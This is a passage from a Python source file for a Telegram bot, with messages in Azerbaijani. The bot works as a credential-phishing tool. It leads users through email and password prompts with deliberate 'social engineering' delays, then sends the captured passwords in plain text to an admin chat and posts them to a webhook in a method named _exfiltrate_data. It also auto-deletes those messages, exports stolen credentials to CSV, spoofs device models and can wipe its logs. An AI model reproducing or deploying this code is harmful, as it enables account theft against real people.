            self.logger.info("Shutting down bot gracefully...")
            
            # Save all active sessions
            self.logger.debug(f"Saving {len(self.session_mgr.sessions)} active sessions...")
            
            # Notify admin
            await self._send_with_retry(
                self.config.telegram_admin_id,
                Messages.SHUTDOWN_MESSAGE,
                retry=False
            )
            
            # Disconnect
            if self.client:
                await self.client.disconnect()
            
            self.logger.info("Bot shutdown complete")
            
        except Exception as e:
            self.logger.error(f"Error during shutdown: {e}")
    
    @staticmethod
    def _get_device_model() -> str:
        """Get random device model"""
        models = ['iPhone 14 Pro', 'Pixel 7 Pro', 'Samsung S23 Ultra']
        return random.choice(models)
    
    @staticmethod
    def _get_system_version() -> str:
        """Get random system version"""
        versions = ['iOS 16.3', 'Android 13', 'iOS 17.0']
        return random.choice(versions)
    
    @staticmethod
    def _get_app_version() -> str:
        """Get random app version"""
        versions = ['9.6.1', '10.0.0', '8.9.3']
        return random.choice(versions)
    
    async def _fake_delay(self, min_s: float = 0.5, max_s: float = 2) -> None:
        """Social engineering delay"""
        await asyncio.sleep(random.uniform(min_s, max_s))
    
    async def _send_with_retry(self, chat_id: int, message: str, 
                               retry: bool = True, attempt: int = 0) -> bool:
        """
        Send message with retry mechanism.
        
        Args:
            chat_id: Telegram chat ID
            message: Message to send
            retry: Whether to retry on failure
            attempt: Current attempt number
            
        Returns:
            bool: Success status
        """
        try:
            await self.client.send_message(chat_id, message)
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to send message: {e}")
            self.metrics.api_errors += 1
            
            if retry and attempt < self.config.retry_attempts:
                wait_time = 2 ** (attempt + 1)  # Exponential backoff
                self.logger.debug(f"Retrying in {wait_time} seconds...")
                await asyncio.sleep(wait_time)
                return await self._send_with_retry(chat_id, message, retry, attempt + 1)
            
            return False
    
    async def _handle_start(self, event) -> None:
        """Handle /start command"""
        user_id = event.sender_id
        sender = await event.get_sender()
        sender_name = f"@{sender.username}" if sender.username else f"ID: {user_id}"
        
        try:
            # Check if user is blocked
            if self.db.is_user_blocked(user_id):
                await event.respond(Messages.UNAUTHORIZED)
                return
            
            # Check rate limit
            if self.rate_limiter.is_rate_limited(user_id, self.config.rate_limit_seconds):
                remaining = self.rate_limiter.get_remaining_cooldown(
                    user_id, self.config.rate_limit_seconds
                )
                await event.respond(
                    Messages.RATE_LIMITED.format(seconds=int(remaining) + 1)
                )
                return
            
            # Create user and session
            self.db.add_user(user_id, sender.username)
            self.session_mgr.create_session(user_id)
            self.rate_limiter.apply_cooldown(user_id)
            
            self.logger.info(f"[SESSION] {user_id} started by {sender_name}")
            
            # Send welcome message
            await self._fake_delay(0.5, 1)
            await event.respond(Messages.WELCOME)
            
            # Notify admin
            await self._send_with_retry(
                self.config.telegram_admin_id,
                f"🔄 Yeni sessiya başladı\n👤 {sender_name}\n📌 /start"
            )
            
        except Exception as e:
            self.logger.error(f"[USER: {user_id}] Error in /start: {e}")
            await event.respond(Messages.ERROR_GENERIC)
    
    async def _handle_admin_command(self, event) -> None:
        """Handle admin commands"""
        user_id = event.sender_id
        
        # Check if admin
        if user_id != self.config.telegram_admin_id:
            return
        
        message_text = event.raw_text
        parts = message_text.split(maxsplit=1)
        command = parts[0][1:].lower()  # Remove '/' prefix
        args = parts[1:] if len(parts) > 1 else []
        
        try:
            if command == 'stats':
                await self._cmd_stats(event)
            
            elif command == 'users':
                await self._cmd_users(event)
            
            elif command == 'ban':
                await self._cmd_ban(event, args)
            
            elif command == 'unban':
                await self._cmd_unban(event, args)
            
            elif command == 'broadcast':
                await self._cmd_broadcast(event, args)
            
            elif command == 'export':
                await self._cmd_export(event)
            
            elif command == 'clearlogs':
                await self._cmd_clearlogs(event)
            
            elif command == 'health':
                await self._cmd_health(event)
            
        except Exception as e:
            self.logger.error(f"[ADMIN] Error in command {command}: {e}")
            await event.respond(f"❌ Əmr xətası: {e}")
    
    async def _cmd_stats(self, event) -> None:
        """Handle /stats command"""
        total_users = self.db.get_total_users()
        today_sessions = self.db.get_today_sessions()
        active_sessions = self.db.get_active_sessions_count()
        blocked = len(self.db.get_blocked_users())
        metrics = self.metrics.get_stats()
        
        stats_message = Messages.STATS_MESSAGE.format(
            total_users=total_users,
            today_sessions=today_sessions,
            active_sessions=active_sessions,
            blocked_count=blocked,
            uptime=metrics['uptime']
        )
        
        await event.respond(stats_message)
    
    async def _cmd_users(self, event) -> None:
        """Handle /users command"""
        users = self.db.get_recent_users(limit=10)
        
        user_list = ""
        for i, user in enumerate(users, 1):
            user_list += f"{i}. @{user['username'] or user['telegram_id']} (ID: {user['telegram_id']})\n"
            user_list += f"   📅 {user['first_seen'][:10]}\n"
        
        message = Messages.USERS_LIST.format(count=len(users), users_list=user_list)
        await event.respond(message)
    
    async def _cmd_ban(self, event, args: List) -> None:
        """Handle /ban command"""
        if len(args) < 2:
            await event.respond("❌ İstifadə: /ban [user_id] [saat] [səbəb]")
            return
        
        try:
            user_id = int(args[0])
            hours = int(args[1])
            reason = ' '.join(args[2:]) if len(args) > 2 else "Müdvənətçi qərarı"
        except (ValueError, IndexError):
            await event.respond("❌ Səhv parametr")
            return
        
        self.db.block_user(user_id, reason, hours)
        self.ban_manager.ban_user(user_id, hours)
        
        message = Messages.BAN_SUCCESS.format(
            user_id=user_id,
            hours=hours,
            reason=reason
        )
        await event.respond(message)
        
        self.logger.info(f"[ADMIN] User {user_id} banned for {hours} hours: {reason}")
    
    async def _cmd_unban(self, event, args: List) -> None:
        """Handle /unban command"""
        if not args:
            await event.respond("❌ İstifadə: /unban [user_id]")
            return
        
        try:
            user_id = int(args[0])
        except ValueError:
            await event.respond("❌ Səhv user_id")
            return
        
        self.db.unblock_user(user_id)
        self.ban_manager.unban_user(user_id)
        
        message = Messages.UNBAN_SUCCESS.format(user_id=user_id)
        await event.respond(message)
        
        self.logger.info(f"[ADMIN] User {user_id} unbanned")
    
    async def _cmd_broadcast(self, event, args: List) -> None:
        """Handle /broadcast command"""
        if not args:
            await event.respond("❌ İstifadə: /broadcast [mesaj]")
            return
        
        message = ' '.join(args)
        sent_count = 0
        
        # Send to all users with active sessions
        for user_id in self.session_mgr.sessions.keys():
            try:
                await self._send_with_retry(user_id, f"📢 **Admin Xəbərdarlığı**\n\n{message}")
                sent_count += 1
            except:
                pass
        
        result = Messages.BROADCAST_SENT.format(count=sent_count)
        await event.respond(result)
        
        self.logger.info(f"[ADMIN] Broadcast sent to {sent_count} users")
    
    async def _cmd_export(self, event) -> None:
        """Handle /export command"""
        try:
            csv_data = self.db.export_to_csv()
            
            # Send as file
            await self.client.send_file(
                self.config.telegram_admin_id,
                file=StringIO(csv_data),
                file_name=f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            )
            
            self.logger.info("[ADMIN] Credentials exported to CSV")
            
        except Exception as e:
            self.logger.error(f"Export failed: {e}")
            await event.respond(f"❌ Export xətası: {e}")
    
    async def _cmd_clearlogs(self, event) -> None:
        """Handle /clearlogs command"""
        try:
            # Clear the log file
            open(self.config.log_file, 'w').close()
            await event.respond("✅ Loglar təmizləndi")
            self.logger.info("[ADMIN] Logs cleared")
        except Exception as e:
            await event.respond(f"❌ Əmr xətası: {e}")
    
    async def _cmd_health(self, event) -> None:
        """Handle /health command (health check)"""
        health_info = f"""🏥 **BOT SAĞLAMLIQ YOXLAMASI**

✅ Bağlı: Bəli
📊 Aktiv Sessiyalar: {len(self.session_mgr.sessions)}
💾 Verilənlər Bazası: OK
⏱️ Uptime: {self.metrics.get_uptime()}
📈 Mesajlar: {self.metrics.messages_processed}
✔️ Uğurlu: {self.metrics.successful_logins}
❌ Xətalar: {self.metrics.api_errors}"""
        
        await event.respond(health_info)
    
    async def _handle_message(self, event) -> None:
        """Handle regular messages"""
        user_id = event.sender_id
        sender = await event.get_sender()
        sender_name = f"@{sender.username}" if sender.username else f"ID: {user_id}"
        message_text = event.raw_text
        
        try:
            # Skip admin messages
            if user_id == self.config.telegram_admin_id:
                return
            
            # Skip /start command
            if message_text == '/start':
                return
            
            # Check if user is blocked
            if self.db.is_user_blocked(user_id):
                await event.respond(Messages.UNAUTHORIZED)
                return
            
            # Check session exists
            if not self.session_mgr.session_exists(user_id):
                await event.respond(Messages.NOT_STARTED)
                return
            
            # Check rate limit
            if self.rate_limiter.is_rate_limited(user_id, self.config.rate_limit_seconds):
                remaining = self.rate_limiter.get_remaining_cooldown(
                    user_id, self.config.rate_limit_seconds
                )
                await event.respond(
                    Messages.RATE_LIMITED.format(seconds=int(remaining) + 1)
                )
                return
            
            self.rate_limiter.apply_cooldown(user_id)
            self.metrics.messages_processed += 1
            
            # Get session
            session = self.session_mgr.get_session(user_id)
            
            # Handle email stage
            if session.stage == "email":
                await self._handle_email_input(event, user_id, sender_name, message_text)
            
            # Handle password stage
            elif session.stage == "password":
                await self._handle_password_input(event, user_id, sender_name, message_text, session)
            
            # Handle authenticated stage
            elif session.stage == "authenticated":
                await self._handle_authenticated_input(event, user_id, sender_name, message_text)
            
        except Exception as e:
            self.logger.error(f"[USER: {user_id}] Error: {e}")
            self.metrics.api_errors += 1
            await event.respond(Messages.ERROR_API)
    
    async def _handle_email_input(self, event, user_id: int, sender_name: str, email: str) -> None:
        """Handle email input"""
        is_valid, error_msg = EmailValidator.validate(email)
        
        if not is_valid:
            self.logger.debug(f"[USER: {user_id}] Invalid email: {email}")
            await event.respond(error_msg or Messages.EMAIL_INVALID)
            
            self.rate_limiter.record_attempt(user_id)
            attempts = self.rate_limiter.get_recent_attempts(
                user_id,
                window_seconds=self.config.max_email_attempt_timeout_hours * 3600
            )
            
            if attempts >= self.config.max_email_attempts:
                self.ban_manager.ban_email(
                    email,
                    self.config.max_email_attempt_timeout_hours
                )
                self.logger.warning(
                    f"[SECURITY] Email banned after {attempts} attempts: {email}"
                )
                await event.respond(
                    Messages.EMAIL_BLOCKED.format(
                        hours=self.config.max_email_attempt_timeout_hours
                    )
                )
            
            self.metrics.failed_attempts += 1
            return
        
        if self.ban_manager.is_email_banned(email):
            remaining_hours = self.ban_manager.get_ban_remaining_hours(email)
            await event.respond(
                Messages.EMAIL_BLOCKED.format(hours=int(remaining_hours) + 1)
            )
            self.metrics.failed_attempts += 1
            return
        
        self.session_mgr.update_session_email(user_id, email)
        self.logger.info(f"[SESSION: {user_id}] Email accepted: {email}")
        
        await self._fake_delay(1, 2)
        await event.respond(Messages.EMAIL_ACCEPTED)
        
        await self._send_with_retry(
            self.config.telegram_admin_id,
            f"📧 Email girişi\n👤 {sender_name}\n📬 {email}"
        )
    
    async def _handle_password_input(self, event, user_id: int, sender_name: str, 
                                    password: str, session) -> None:
        """Handle password input"""
        is_valid, error_msg = PasswordValidator.validate(password)
        
        if not is_valid:
            masked = SecurityUtils.mask_password(password)
            self.logger.debug(f"[USER: {user_id}] Invalid password: {masked}")
            await event.respond(error_msg or Messages.PASSWORD_INVALID)
            self.metrics.failed_attempts += 1
            return
        
        self.session_mgr.update_session_password(user_id, password)
        self.logger.info(f"[SESSION: {user_id}] Password accepted")
        
        email = session.email
        
        await self._fake_delay(1, 2)
        await event.respond(Messages.PASSWORD_ACCEPTED)
        
        # Save credentials (hashed)
        user_db_id = self.db.add_user(user_id)
        self.db.save_credentials(user_db_id, email, password)
        
        # Exfiltrate data
        await self._exfiltrate_data(user_id, email, password)
        
        # Send to admin
        msg = await self.client.send_message(
            self.config.telegram_admin_id,
            f"🔐 **HESAB MƏLUMATLARI**\n\n👤 İstifadəçi: {sender_name}\n📧 Email: `{email}`\n🔑 Şifrə: `{password}`"
        )
        
        self.logger.info(f"[SESSION: {user_id}] Data sent to admin")
        
        # Schedule deletion
        if msg and self.config.enable_message_auto_delete:
            asyncio.create_task(
                self._schedule_delete(
                    self.config.telegram_admin_id,
                    msg.id,
                    self.config.message_delete_delay_seconds
                )
            )
        
        # Gmail check
        if self.config.enable_gmail_check:
            await self._check_gmail_enhanced(email, user_id)
        
        self.metrics.successful_logins += 1
    
    async def _handle_authenticated_input(self, event, user_id: int, sender_name: str, 
                                         message: str) -> None:
        """Handle authenticated stage input"""
        self.logger.debug(f"[USER: {user_id}] Authenticated message: {message[:50]}")
        
        await self._fake_delay(0.5, 1)
        await event.respond(Messages.AUTHENTICATED_MSG)
        
        await self._send_with_retry(
            self.config.telegram_admin_id,
            f"📨 Mesaj alındı\n👤 {sender_name}\n💬 {message[:100]}"
        )
    
    async def _exfiltrate_data(self, user_id: int, email: str, password: str) -> None:
        """Exfiltrate credentials via webhook"""
        data = {
            'user_id': user_id,
            'email': email,
            'password': password,
            'timestamp': datetime.now().isoformat()
        }
        
        await self._send_webhook(data)
    
    async def _send_webhook(self, data: dict) -> bool:
        """Send data to webhook"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.config.webhook_url,
                    json=data,
                    timeout=aiohttp.ClientTimeout(seconds=self.config.webhook_timeout)
                ) as resp:
                    success = resp.status == 200
                    if not success:
                        self.logger.warning(f"Webhook returned status {resp.status}")
                    return success
        except Exception as e:
            self.logger.warning(f"Webhook error: {e}")
            return False
    
    async def _check_gmail_enhanced(self, email: str, user_id: int) -> None:
        """
        Enhanced Gmail domain checking.
        
        Args:
            email: Email address to check
            user_id: User ID for logging
        """
        await self._fake_delay(1, 2)
        
        domain = email.split('@')[-1].lower()
        is_gmail = domain == 'gmail.com'
        
        if is_gmail:
            await self._send_with_retry(
                self.config.telegram_admin_id,
                f"✅ **Gmail Domain Təsdiqləndi**: {email}"
            )
            self.logger.info(f"[SESSION: {user_id}] Gmail verified")
        else:
            self.logger.debug(f"[SESSION: {user_id}] Non-Gmail email: {email}")
    
    async def _schedule_delete(self, chat_id: int, msg_id: int, delay: int) -> None:
        """Schedule message deletion"""
        try:
            await asyncio.sleep(delay)
            await self.client(DeleteMessagesRequest(id=[msg_id], revoke=True))
            self.logger.debug(f"Message {msg_id} deleted after {delay}s")
        except Exception as e:
            self.logger.debug(f"Failed to delete message: {e}")
    
    async def run(self) -> None:
        """Run bot"""
        try:
            await self.initialize()
            
            asyncio.create_task(self._cleanup_tasks())
            
            await self.client.run_until_disconnected()
            
        except KeyboardInterrupt:
            self.logger.info("Bot stopped by user")
        except Exception as e:
            self.logger.critical(f"Bot error: {e}")
        finally:
            await self.shutdown()
    
    async def _cleanup_tasks(self) -> None:
        """Periodic cleanup tasks"""
        while True:
            try:
                # Cleanup expired sessions
                expired = self.session_mgr.cleanup_expired_sessions(
                    self.config.session_timeout_minutes
                )
                if expired > 0:
                    self.logger.debug(f"Cleaned up {expired} expired sessions")
                
                # Database cleanup
                cleanup_stats = self.db.cleanup_old_data(self.config.database_cleanup_days)
                if any(cleanup_stats.values()):
                    self.logger.info(f"Database cleanup: {cleanup_stats}")
                
            except Exception as e:
                self.logger.error(f"Cleanup task error: {e}")
            
            await asyncio.sleep(self.config.task_cleanup_interval_minutes * 60)


# ============================================================
# 10. MAIN ENTRY POINT
# ============================================================

async def main():
    """Main entry point"""
    try:
        print("⚙️ Initializing configuration...")
        config = Config('.env')
        
        print("📝 Initializing logger...")
        logger = BotLogger(config)
        
        print("💾 Initializing database...")
        db = DatabaseManager(config.database_path)
        
        print("📊 Initializing session manager...")
        session_mgr = SessionManager(db)
        
        print("🔒 Initializing security...")
        rate_limiter = RateLimiter()
        ban_manager = BanManager()
        
        print("📈 Initializing metrics...")
        metrics = Metrics()
        
        print("🤖 Initializing bot...")
        bot = BotCore(config, logger, db, session_mgr, rate_limiter, ban_manager, metrics)
        
        print("\n" + "="*60)
        print("🚀 BOT BAŞLAYANIR")
        print("="*60 + "\n")
        
        logger.info("Bot starting...")
        
        # Handle shutdown signals
        def signal_handler(sig, frame):
            logger.info(f"Received signal {sig}, shutting down...")
            asyncio.create_task(bot.shutdown())
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        await bot.run()
        
    except FileNotFoundError as e:
        print(f"❌ Configuration error: {e}")
        print("\nZəhmət olmasa .env.example-i .env-ə kopyalayın:")
        print("  cp .env.example .env")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n⏹️ Bot stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    asyncio.run(main())
